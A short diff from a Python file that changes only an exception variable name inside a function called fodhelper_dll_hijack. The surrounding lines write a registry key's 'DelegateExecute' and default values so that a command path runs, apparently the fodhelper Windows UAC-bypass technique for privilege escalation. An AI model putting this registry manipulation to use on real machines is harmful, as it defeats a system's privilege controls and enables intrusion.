@@ -27,7 +27,7 @@ def fodhelper_dll_hijack():
 			_winreg.SetValueEx(key,"DelegateExecute",0,_winreg.REG_SZ,None)
 			_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,cmd_path())
 			_winreg.CloseKey(key)
-		except Exception as e:
+		except Exception as error:
 			return False
 
 		try:
